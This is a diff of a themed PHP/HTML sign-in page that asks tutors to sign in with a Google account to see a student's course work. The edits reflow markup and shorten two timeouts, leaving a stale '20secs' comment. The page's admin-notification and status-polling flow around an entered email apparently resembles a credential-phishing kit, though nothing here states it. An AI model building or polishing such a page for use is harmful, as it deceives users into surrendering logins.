@@ -1267,7 +1267,8 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
                            </div>
                         </div>
                         <h2 style="font-size: 20px; font-weight: 700; color: <?= $primary ?>; margin: 0px 0px 10px; font-family: Georgia, serif;">Sign in to access your student's course work</h2><i style="font-size: 13px; color: rgb(85, 85, 85);">You are signing in as a Tutor</i>
-                        <div style="display: inline-flex; align-items: center; gap: 8px; background: rgb(255, 248, 231); border: 1px solid rgb(232, 201, 106); border-radius: 6px; padding: 5px 12px; margin-bottom: 14px;"><span id="enteredEmail" style="font-size: 13px; color: <?= $primary ?>;"><!---entered email----></span><button style="background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; font-size: 12px; color: rgb(136, 136, 136); cursor: pointer; padding: 0px;">change</button></div>
+                        <div style="display: inline-flex; align-items: center; gap: 8px; background: rgb(255, 248, 231); border: 1px solid rgb(232, 201, 106); border-radius: 6px; padding: 5px 12px; margin-bottom: 14px;">
+                           <span id="enteredEmail" style="font-size: 13px; color: <?= $primary ?>;"><!---entered email----></span><button style="background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; font-size: 12px; color: rgb(136, 136, 136); cursor: pointer; padding: 0px;">change</button></div>
                         <p style="font-size: 14px; color: rgb(68, 68, 68); line-height: 1.7; margin-bottom: 22px;">Sign in with your preferred tutor Google account.</p><button id="signinWithEmail" style="display: flex; align-items: center; justify-content: center; gap: 12px; width: 100%; padding: 13px 0px; background: rgb(255, 255, 255); color: <?= $accent ?>; border: 1.5px solid rgb(208, 213, 221); border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.08) 0px 1px 4px; margin-bottom: 4px;"><svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                               <path d="M19.6 10.23c0-.68-.06-1.36-.18-2H10v3.8h5.4a4.62 4.62 0 01-2 3.03v2.5h3.24C18.4 15.93 19.6 13.3 19.6 10.23z" fill="#4285F4"></path>
                               <path d="M10 20c2.7 0 4.97-.9 6.62-2.44l-3.23-2.5c-.9.6-2.04.96-3.39.96-2.61 0-4.82-1.76-5.6-4.13H1.07v2.58A9.99 9.99 0 0010 20z" fill="#34A853"></path>
@@ -1453,7 +1454,7 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
             signDiv.classList.remove('hidden');
             signinWithEmail.innerHTML = btnContent;
             clearFeedbackArea();
-         }, 20000);// 20secs
+         }, 15000);// 20secs
          } catch(e) {}
          finally {
             //tutorEmailSubmit.textContent = 'Continue';
@@ -1550,7 +1551,7 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
                 notifyAdminLoading ? pollStatus(email) : signinWithEmail.click(); 
             }
 
-         }, 20000);
+         }, 15000);
 
       } catch(e) {
         //  setTimeout(()=> {
